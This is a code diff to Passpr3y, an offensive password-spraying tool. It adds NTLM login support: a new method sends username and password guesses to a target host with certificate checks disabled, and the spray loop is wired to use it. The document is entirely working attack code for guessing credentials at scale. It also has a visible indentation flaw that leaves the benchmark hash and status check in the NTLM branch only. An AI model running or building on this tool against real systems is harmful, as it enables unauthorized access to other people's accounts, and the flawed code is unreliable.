@@ -11,6 +11,7 @@
 import argparse
 import collections
 import requests
+from requests_ntlm import HttpNtlmAuth
 import os
 import sys
 import time
@@ -55,16 +56,23 @@ class Passpr3y:
         if not os.path.exists("logs"):
             os.makedirs("logs")
 
-        # Parse request file, preserve order of headers
-        requestFile = open(self.requestFile, 'r')
-        lineList = requestFile.readlines()
-        newlineIndex = lineList.index('\n')
-        self.endPoint = lineList[0].split(' ')[1].strip()
-        self.headerDict = collections.OrderedDict(item.split(': ') for item in map(str.strip, lineList[1:newlineIndex]))
-        self.dataDict = collections.OrderedDict(item.split('=') for item in map(str.strip, lineList[newlineIndex+1].split('&')))
-        requestFile.close()
-        if("USERPR3Y" not in self.dataDict.values() or "PASSPR3Y" not in self.dataDict.values()):
-            sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")
+        # Parse web request file, preserve order of headers
+        if(not self.ntlm):
+            requestFile = open(self.requestFile, 'r')
+            lineList = requestFile.readlines()
+            newlineIndex = lineList.index('\n')
+            self.endPoint = lineList[0].split(' ')[1].strip()
+            self.headerDict = collections.OrderedDict(item.split(': ') for item in map(str.strip, lineList[1:newlineIndex]))
+            self.dataDict = collections.OrderedDict(item.split('=') for item in map(str.strip, lineList[newlineIndex+1].split('&')))
+            requestFile.close()
+            if("USERPR3Y" not in self.dataDict.values() or "PASSPR3Y" not in self.dataDict.values()):
+                sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")
+        else:
+            requestFile = open(self.requestFile, 'r')
+            lineList = requestFile.readlines()
+            self.headerDict = collections.OrderedDict(item.split(': ') for item in map(str.strip, lineList[1:-1]))
+            requestFile.close()
+
 
         # Parse usernames file
         usernameFileHandle = open(self.usernameFile, 'r')
@@ -81,11 +89,12 @@ class Passpr3y:
         self.slowSleepTime = float(self.shotgunSleepTime)/float(len(self.usernameList))
 
         # Get injection points
-        for key,value in self.dataDict.items():
-            if value == "USERPR3Y":
-                self.usernameKey = key
-            elif value == "PASSPR3Y":
-                self.passwordKey = key
+        if(not self.ntlm):
+            for key,value in self.dataDict.items():
+                if value == "USERPR3Y":
+                    self.usernameKey = key
+                elif value == "PASSPR3Y":
+                    self.passwordKey = key
     
     def showWarning(self):
         # Ensure spray time is appropriate
@@ -102,15 +111,19 @@ class Passpr3y:
         randomPass = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
         print("%sPerforming test request to benchmark failed attempt...%s" % (Y,W))
 
-        self.test_response = self.performRequest(randomUser, randomPass)
-        self.test_hexDigest = self.getHashFromResponse(self.test_response)
-
-        if(self.test_response.status_code == 400):
-            print("%sTest request returned status code " % (R) + str(self.test_response.status_code) + "%s" % (W))
-            if(input("Are you sure you want to continue? (y/N) ") != 'y'):
-                sys.exit("Unsatisfactory HTTP response code.")
+        if(not self.ntlm):
+            self.test_response = self.performRequest(randomUser, randomPass)
         else:
-            print("%sTest request did not return 400, moving on.%s\n" % (G,W))
+            self.test_response = self.performNTLMRequest(randomUser, randomPass)
+
+            self.test_hexDigest = self.getHashFromResponse(self.test_response)
+
+            if(self.test_response.status_code == 400):
+                print("%sTest request returned status code " % (R) + str(self.test_response.status_code) + "%s" % (W))
+                if(input("Are you sure you want to continue? (y/N) ") != 'y'):
+                    sys.exit("Unsatisfactory HTTP response code.")
+            else:
+                print("%sTest request did not return 400, moving on.%s\n" % (G,W))
 
     def performSpray(self):
         # Spray
@@ -124,7 +137,10 @@ class Passpr3y:
 
             # Perform spray
             for username in self.usernameList:
-                response = self.performRequest(username, password)
+                if(self.ntlm):
+                    response = self.performNTLMRequest(username, password)
+                else:
+                    response = self.performRequest(username, password)
 
                 hexDigest = self.getHashFromResponse(response)
 
@@ -241,6 +257,16 @@ class Passpr3y:
         s.verify = False
 
         return s.send(prepped)
+
+    def performNTLMRequest(self, username, password):
+        # Attempt NTLM login
+        print("\t Attempting NTLM " + username + ':' + password)
+        if(self.ssl):
+            url = "https://" + self.headerDict["Host"] + '/'
+        else:
+            url = "http://" + self.headerDict["Host"] + '/'
+        
+        return requests.get(url, proxies=self.proxy, verify=False, auth=HttpNtlmAuth(username, password))
 
 def pretty_print_POST(req):
     """
